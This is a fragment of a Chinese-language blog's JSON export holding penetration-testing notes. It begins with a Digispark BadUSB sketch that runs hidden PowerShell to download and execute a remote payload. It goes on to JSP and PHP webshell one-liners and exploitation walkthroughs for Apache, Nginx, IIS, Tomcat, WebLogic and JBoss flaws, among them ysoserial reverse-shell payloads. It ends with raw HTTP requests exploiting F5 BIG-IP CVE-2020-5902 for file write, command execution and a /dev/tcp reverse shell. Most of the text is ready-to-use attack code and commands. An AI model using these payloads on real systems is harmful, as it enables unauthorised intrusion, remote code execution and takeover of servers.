-WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;122.51.93.116&#x2F;payload.ps1&#39;);&quot;)); DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(KEY_ENTER); DigiKeyboard.delay(750); DigiKeyboard.sendKeyStroke(KEY_ENTER);&#125;void loop() &#123;&#125; image.png 3、测试代码1、选择开发板 image.png 2、打印示例 image.png 3、成功打印出HelloDigispark！ 4、注意如果遇到下列的情况，更换其他的 usb 接口 image.png 格式化 image.png image.png 5、代码生成器【digispark 代码生成器】Automator.zip image.png 6、payload 转换代码Python 转换脚本_2.zip image.png 用 arduino 的 IDE 打开转换好的 zhuanhao.ino 文件 image.png","categories":[],"tags":[]},{"title":"命令执行写webshell","slug":"rqob7g","date":"2020-08-06T14:49:23.000Z","updated":"2020-08-29T14:11:58.456Z","comments":true,"path":"2020/08/06/rqob7g/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/06/rqob7g/","excerpt":"","text":"1、jsp 版注意：针对 windows 需要通过^转义的字符包括&lt;&gt;和“针对 linux 需要通过\\转义1、非菜刀版一句话 1&lt;%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"/\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());%&gt; 变形成为 1^&lt;%if(request.getParameter(^\"f^\")!=null)(new java.io.FileOutputStream(application.getRealPath(^\"/^\")+request.getParameter(^\"f^\"))).write(request.getParameter(^\"t^\").getBytes());%^&gt; 2、通过CTFcrackTools.jar对 echo 等内容进行 url 编码 image.png 3、写入非菜刀版一句话 image.png 4、访问jsp 一句话客户端.html，上传菜刀版 shell1.jsp image.png 5、连接菜刀成功 image.png image.png","categories":[],"tags":[]},{"title":"中间件漏洞","slug":"dlvqrg","date":"2020-07-28T06:03:55.000Z","updated":"2020-08-29T14:11:58.752Z","comments":true,"path":"2020/07/28/dlvqrg/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/07/28/dlvqrg/","excerpt":"","text":"apache解析漏洞影响范围：1、apahce 与 php 是以 module 方式交互（phpinfo）2、apahce 全版本Apache 默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在 mime.types 文件内），则继续向左识别，直到识别到合法后缀才进行解析。 AddHandler 导致的解析漏洞httpd.conf 中存在 1AddHandler application&#x2F;x-httpd-php .php 只要文件中存在.php 就可以 php 执行 .htacess 漏洞httpd.conf 中存在 12AllowOverride AllLoadModule rewrite_module &#x2F;usr&#x2F;lib&#x2F;apache2&#x2F;modules&#x2F;mod_rewrite.so .htaccess 文件 1AddType application&#x2F;x-httpd-php xxx 或者 12&lt;FilesMatch &quot;shell.jpg&quot;&gt;SetHandler application&#x2F;x-httpd-php Apache HTTPD 换行解析漏洞（CVE-2017-15715）影响范围：2.4.0~2.4.29 版本1、上传一个 xx.php%0a 的文件，windows 下访问 xx.php 即可，linux 下访问 xx.php%0a nginx解析漏洞影响范围：1、默认存在 2、在 Fast-CGI 关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞该漏洞是 Nginx 配置所导致，与 Nginx 版本无关)，只要存在 php.ini 中的 cgi.fix_pathinfo = 1，就存在（可以通过 phpinfo 判断 image.png 1、直接在正常图片 URL 后添加 /.php 即可以 php 执行在一个文件路径(/xx.jpg)后面加上%00.php 会将 /xx.jpg%00.php 解析为 php 文件。这是从 /test.jpg/x.php 演变过来的 12www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;1.phpwww.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;%20\\0.php 另外一种手法：上传一个名字为 test.jpg，以下内容的文件。 1&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt; 然后访问 test.jpg/.php,在这个目录下就会生成一句话木马 shell.php。 Nginx 空字节任意代码执行漏洞影响版本：Nginx 0.5, 0.6,0.7._&lt;= 0.7.65 0.8._ &lt;= 0.8.37 上传 1.jpg,内容为 1&lt;?php phpinfo();?&gt; image.png 访问 1.jpg 抓包并将 1.jpg 改成 1.jpg..php 然后在 hex 里将第一个.修改为空字节 00 即可执行 php，该漏洞不受 cgi.fix_pathinfo 影响，当 cgi.fix_pathinfo 为 0 时，依旧解析。 Nginx 文件名逻辑漏洞（CVE-2013-4547）影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.71、访问 http://your-ip:8080/ 上传文件 image.png 2、访问http://your-ip:8080/uploadfiles/info.jpg 并抓包更为http://your-ip:8080/uploadfiles/info.jpg…php（三个.） image.png 将前两个.修改为 20 和 00 image.png 该漏洞不受 cgi.fix_pathinfo 影响，当其为 0 时，依旧解析，在 Windows 上有所限制（针对 linux）。 CRLF 注入 image.png 就可通过 1http:&#x2F;&#x2F;127.0.0.1&#x2F;%0aX-XSS-Protection:%200%0a%0d%0a%0d%3Cimg%20src&#x3D;1%20onerror&#x3D;alert(&#x2F;xss&#x2F;)%3E 触发。 目录穿越(目录遍历)Nginx 在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。错误的配置文件示例（原本的目的是为了让用户访问到 D:/phpStudy/WWW/phpMyAdmin 的文件）： 123location /phpMyAdmin &#123; alias \"D:/phpStudy/WWW/phpMyAdmin/\"; autoindex on; image.png 只需要保证 location 和 alias 的值都有后缀/或都没有/这个后缀。 123location /phpMyAdmin/ &#123; alias \"D:/phpStudy/WWW/phpMyAdmin/\"; autoindex on; 去掉/ 123location /phpMyAdmin &#123; alias \"D:/phpStudy/WWW/phpMyAdmin\"; autoindex on; 即可解决 image.png 当 Nginx 配置文件中，autoindex 的值为 on 时，将造成一个目录遍历漏洞。 image.png 当配置为 on 时存在目录遍历，add_header 被覆盖 iis解析漏洞IIS 6.x基于文件名该版本 默认会将 *.asp;.jpg 此种格式的文件名，当成 Asp 解析，原理是服务器默认不解析; 号及其后的内容，相当于截断。 1.asa，.cdx，.cer解析为asp 基于目录名（https://github.com/c0ny1/upload-fuzz-dic-builder）该版本 默认会将 *.asp/目录下的所有文件当成 Asp 解析 image.png PUT 任意文件写入影响范围：IIS 6.0 在 Web 服务扩展中开启了 WebDAV 之后，支持多种请求，配合写入权限，可造成任意文件写入。1、webDAV 未开启前 image.png 2、webDAV 开启后 image.png 3、工具 image.png image.png CVE-2015-1635&amp;ms15-0341、输入命令curl http``:``/``/``10.66``.60``.22``/`` ``-``H`` ``&quot;Host: irrelevant&quot;`` ``-``H`` ``&quot;Range: bytes=0-18446744073709551615&quot;``|``findstr ``&quot;range is not satisfiable&quot;截图： 111.png 发现返回”range is not satisfiable”就说明有漏洞。 CVE-2017-7269影响范围： 在 Windows 2003 R2（Microsoft(R) Windows(R) Server2003, Enterprise Edition Service Pack 2）上使用 IIS 6.0 并开启 WebDAV 扩展exp:https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py IIS 7.x影响范围：Fast-CGI 运行模式（phpinfo） image.png 1、安装 iis 7.52、下载php-5.2.6-win32-installer.msi 3.打开 msi，一直下一步来到选择 web server setup 的界面，在这里选择 IIS fastcgi,之后一直下一步 4.打开 IIS，管理工具 -&gt;Internet 信息服务(IIS)管理器 image.png 5、添加安装的 php-cgi.exe 路径，描述随意。 image.png 6、添加映射。 image.png 7.phpinfo 测试 image.png IIS7.x 版本 在 Fast-CGI 运行模式下,上传任意文件，例：phpinfo.jpg，只需要在访问 url 后面加上/.php，会将 test.jpg 解析为 php 文件。http://192.168.3.42/phpinfo.jpg/.php image.png tomcatCVE-2017-12615环境：Tomcat/8.0.30（暂未发现有版本限制，也有说法是存在于 7.0.0-7.0.79）漏洞本质是 Tomcat 配置文件/conf/web.xml 配置了可写（readonly=false），导致我们可以往服务器写文件： 1234&lt;init-param&gt; &lt;param-name&gt;readonly&lt;&#x2F;param-name&gt; &lt;param-value&gt;false&lt;&#x2F;param-value&gt;&lt;&#x2F;init-param&gt; 新建一个 1.jsp 文件的格式为（上传 webshell 文件，需要在文件名后加空格%20 或者/） image.png 改成 image.png CVE-2019-0232影响范围：9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 ， 7.0.0 ~ 7.0.93 影响系统： Windows 默认配置不存在此漏洞（仅对 windows 有效） Tomcat + 弱口令 &amp;&amp; 后台 getshell 漏洞webapps 下的 host-manager 和 manager，都有一个共同的文件夹 META-INF，里面都有 context.xml，通过这个文件配置本地连接还是远程连接（默认本地连接）1、访问http://ip:port/manager/status image.png tomcat7.0.94 中默认没有任何用户，且 manager 页面只允许本地 IP 访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。 Tomcat manager App 暴力破解1、访问 http://ip:port/manager/html, 输入用户名 123，密码 123，抓包，如下。 image.png image.png 刚才输入的账号密码在 HTTP 字段中的 Authorization 中，规则为 Base64Encode(user:passwd) Authorization: Basic dG9tY2F0OmFkbWlu 解码之后如下： image.png 2、发送到 intruder image.png image.png position1 设置为用户名字典position2 设置为:position3 设置为密码取消勾选 image.png 3、爆破成功 image.png 注意：在 tomcat7.0 后，默认会有登录次数限制，需要手动更改 conf/server.xml 才能进行爆破 CVE-2020-1938工具：https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi image.png CVE-2016-8735（暂未复现）weblogicCVE-2017-10271访问 /wls-wsat/CoordinatorPortType 返回如下页面，则可能存在此漏洞。(也有可能为 CVE-2019-02725) image.png 受影响的 uri： 12345678&#x2F;wls-wsat&#x2F;CoordinatorPortType&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC&#x2F;wls-wsat&#x2F;ParticipantPortType&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType&#x2F;wls-wsat&#x2F;CoordinatorPortType11&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11&#x2F;wls-wsat&#x2F;ParticipantPortType11&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType11 工具：Java 反序列化漏洞利用工具 V1.7.jar image.png CVE-2019-2725访问 /_async/AsyncResponseService 返回如下页面，则可能存在此漏洞。 image.png 受影响的 url： 123&#x2F;_async&#x2F;AsyncResponseService&#x2F;_async&#x2F;AsyncResponseServiceJms&#x2F;_async&#x2F;AsyncResponseServiceHttps 工具：Java 反序列化漏洞利用工具 V1.7.jarJava 反序列化漏洞利用工具 V1.7.jar CVE-2014-4210CVE-2018-2628CVE-2018-2628-master.zipCVE-2018-2894工具：https://github.com/0xn0ne/weblogicScannerweblogicScanner-master.zippython3 ws.py -t 122.51.93.116:7001 image.png CVE-2018-2894访问http://192.168.56.47:7001/ws_utc/config.do，设置 Work Home Dir 为/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css。将目录设置为ws_utc应用的静态文件 css 目录，访问这个目录是无需权限的，这一点很重要。 image.png 然后点击安全 -&gt; 增加， image.png 然后上传 webshell：上传后，查看返回的数据包，其中有时间戳： image.png 然后访问http://192.168.56.47:7001/ws_utc/css/config/keystore/1558333250831_1.jsp，即可执行 webshell： image.png CVE-2014-4210影响版本：10.0.2.0, 10.3.6.01、访问 /uddiexplorer/SearchPublicRegistries.jsp，若能正常访问，则可能存在此漏洞 image.png 2、填写任意内容，点击 search 以后抓包 image.png 3、将 post 改为 get 以后 operator 为可控参数，将其改成 http 协议端口 image.png 4、若存在开放端口即返回 error code image.png 若开放端口为 HTTP 协议，则会返回 did not have a valid SOAP content-type。访问不存在的端口 could not connect over HTTP to server image.png Weblogic 弱口令 &amp; 后台 getshell1、http://122.51.93.116:7001/console/login/LoginForm.jspweblogic:Oracle@123各种设备弱口令：https://cirt.net/passwords?criteria=weblogic image.png 2、部署—安装—上传文件-上传 war 包 image.png image.png](https://cdn.nlark.com/yuque/0/2020/png/258143/1589624306147-1c42a5fa-cd58-4bc9-b030-5f2f42c6bcb0.png#align=left&display=inline&height=199&margin=%5Bobject%20Object%5D&name=image.png&originHeight=398&originWidth=834&size=48867&status=done&style=none&width=417)![image.png 3、上传文件—-下一步—–下一步—–部署为应用程序–下一步—完成 image.png image.png image.png 4、选中应用程序—-启动 image.png 5、访问：http://ip:port/[war 包名]/[包名内文件名]http://122.51.93.116:7001/hacker/index.jsp JBOSSCVE-2017-12149访问 /invoker/readonly 返回 500，说明页面存在，此页面存在反序列化漏洞。 image.png 漏洞工具：https://github.com/yunxu1/jboss-_CVE-2017-12149jboss-_CVE-2017-12149-master.zip image.png JBoss JMXInvokerServlet 反序列化漏洞访问 /invoker/JMXInvokerServlet 弹出下载，说明接口开放，此接口存在反序列化漏洞。1、攻击机监听nc -nlvp 3333 image.png 2、编写反弹 shell 的命令（通过 ysoserial.jar 序列化工具生成 poc.ser）ysoserial.jar 1java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMjAvMzMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser 此处用的 CommonsCollections上图中的YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMjAvMzMzMyAwPiYx是bash -i &gt;&amp; /dev/tcp/192.168.3.20/3333 0&gt;&amp;1进行的 base64 编码 image.png 只能用 cmd 无法使用 powershell3、抓包http://192.168.3.71:8080/invoker/JMXInvokerServlet image.png 4、发送 poc.ser image.png 5、攻击机成功反弹 shell image.png 或者直接通过 curl 命令curl http://192.168.3。71:8080/invoker/readonly --data-binary poc.ser JBoss JMXInvokerServlet 反序列化漏洞直接使用DeserializeExploit.jar工具 image.png JBoss EJBInvokerServlet 反序列化漏洞CVE-2017-7504访问/jbossmq-httpil/HTTPServerILServlet， 返回 This is theJBossMQ HTTP-IL，说明页面存在，此页面存在反序列化漏洞。 image.png 这里直接无法直接利用 CVE-2017-12149 生成的 poc.ser 1java -jar ysoserial.jar CommonsCollections1 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMjAvMzMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser 此处用的 CommonsCollections1 生成的 poc.ser 发送到/jbossmq-httpil/HTTPServerILServlet 接口中，成功反弹 shell。提醒：发送数据记得将 get 改成 post","categories":[],"tags":[]},{"title":"CVE-2020-5902：F5 BIG-IP 远程代码执行漏洞复现","slug":"pqp9in","date":"2020-07-28T06:03:08.000Z","updated":"2020-08-29T14:11:58.776Z","comments":true,"path":"2020/07/28/pqp9in/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/07/28/pqp9in/","excerpt":"","text":"影响版本 BIG-IP 15.x: 15.1.0/15.0.0BIG-IP 14.x: 14.1.0 ~ 14.1.2BIG-IP 13.x: 13.1.0 ~ 13.1.3BIG-IP 12.x: 12.1.0 ~ 12.1.5BIG-IP 11.x: 11.6.1 ~ 11.6.5 环境搭建12下载https://downloads.f5.com/esd/ecc.sv?sw=BIG-IP&amp;pro=big-ip_v15.x&amp;ver=15.1.0&amp;container=Virtual-Edition 访问：https://192.168.56.93/ image.png 漏洞复现nmap 脚本：http-vuln-cve2020-5902.zip image.png \\*\\* 任意文件上传文件上传一：123456789101112131415161718POST &#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;fileSave.jsp HTTP&#x2F;1.1Host: 192.168.56.93Connection: closeCache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1Content-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: https:&#x2F;&#x2F;192.168.56.93&#x2F;tmui&#x2F;login.jspAccept-Language: zh-CN,zh;q&#x3D;0.9,ko;q&#x3D;0.8,zh-TW;q&#x3D;0.7,en;q&#x3D;0.6Cookie: JSESSIONID&#x3D;B1980CD16AD5E97F597175149BCD19CEContent-Length: 49fileName&#x3D;&#x2F;tmp&#x2F;success&amp;content&#x3D;CVE-2020-5902 image.png 文件上传二：https://192.168.56.93/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test1&amp;content=id image.png image.png 任意文件读取：https://192.168.56.93/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/success image.png 任意命令执行修改 alias 劫持 list 命令为 bash123456789101112GET &#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;tmshCmd.jsp?command&#x3D;create+cli+alias+private+list+command+bash HTTP&#x2F;1.1Host: 192.168.56.93Connection: closeUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Language: zh-CN,zh;q&#x3D;0.9,ko;q&#x3D;0.8,zh-TW;q&#x3D;0.7,en;q&#x3D;0.6Cookie: JSESSIONID&#x3D;B1980CD16AD5E97F597175149BCD19CE image.png 写入 bash 文件123456789101112GET &#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;fileSave.jsp?fileName&#x3D;&#x2F;tmp&#x2F;test3&amp;content&#x3D;ifconfig HTTP&#x2F;1.1Host: 192.168.56.93Connection: closeUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Language: zh-CN,zh;q&#x3D;0.9,ko;q&#x3D;0.8,zh-TW;q&#x3D;0.7,en;q&#x3D;0.6Cookie: JSESSIONID&#x3D;B1980CD16AD5E97F597175149BCD19CE image.png image.png 命令执行1、执行 bash 文件（未登录）https://192.168.56.93/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/test image.png 2、执行 bash 文件（已登录） image.png 注意：登录成功未成功的标志在于 cookie 1234#登录未成功Cookie: JSESSIONID&#x3D;C0A2E25AA53FBAB8A64B71F3045DCC63#登录成功Cookie: JSESSIONID&#x3D;C0A2E25AA53FBAB8A64B71F3045DCC63; BIGIPAuthCookie&#x3D;9856A49B5237A13A081CA03BB37CCFF3039DB71B; BIGIPAuthUsernameCookie&#x3D;admin; F5_CURRENT_PARTITION&#x3D;Common; f5formpage&#x3D;&quot;&#x2F;tmui&#x2F;overview&#x2F;welcome&#x2F;introduction.jsp?&amp;setup&#x3D;true&quot; 还原 list 命令curl -k &quot;https://192.168.56.93/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list&quot; image.png 反弹 shell123456#劫持list命令https:&#x2F;&#x2F;192.168.56.84&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;tmshCmd.jsp?command&#x3D;create+cli+alias+private+list+command+bash#bash文件写入（bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.56.212&#x2F;1234 0&gt;&amp;1）url编码https:&#x2F;&#x2F;192.168.56.84&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;fileSave.jsp?fileName&#x3D;&#x2F;tmp&#x2F;test6&amp;content&#x3D;bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.56.212%2F1234+0%3E%261#反弹shellhttps:&#x2F;&#x2F;192.168.56.84&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;tmshCmd.jsp?command&#x3D;list+&#x2F;tmp&#x2F;test6 image.png image.png","categories":[],"tags":[]}],"categories":[],"tags":[]}